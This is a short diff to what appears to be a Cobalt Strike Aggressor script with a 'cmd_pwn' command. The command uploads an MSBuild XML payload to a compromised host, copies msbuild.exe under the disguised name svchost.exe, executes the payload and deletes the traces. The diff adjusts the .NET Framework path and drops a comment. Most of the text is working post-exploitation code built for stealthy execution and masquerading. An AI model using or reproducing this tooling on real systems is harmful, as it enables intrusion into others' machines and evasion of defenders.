@@ -5,7 +5,6 @@
 # Global Variables
 # This code is a modified version of Chris Ross's script - https://github.com/xorrior/RandomPS-Scripts/blob/master/Invoke-ExecuteMSBuild.ps1
 %globalsettings['XMLHead'] = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml -->
   <PropertyGroup>';
 %globalsettings['XMLBody'] = '</PropertyGroup>
   <Target Name="Hello">
@@ -153,7 +152,7 @@ sub cmd_pwn {
             $data_here = readb($read_handle, -1);
             closef($read_handle);
             bupload_raw($beacon['id'], "C:\\Users\\Public\\Documents\\trusteddata.xml", $data_here);
-            bpowerpick($beacon['id'], "copy-item C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
+            bpowerpick($beacon['id'], "copy-item C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\svchost.exe");
             bpowerpick($beacon['id'], "C:\\Users\\Public\\Documents\\svchost.exe C:\\Users\\Public\\Documents\\trusteddata.xml");
             bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\trusteddata.xml");
             bpowerpick($beacon['id'], "rm C:\\Users\\Public\\Documents\\svchost.exe");
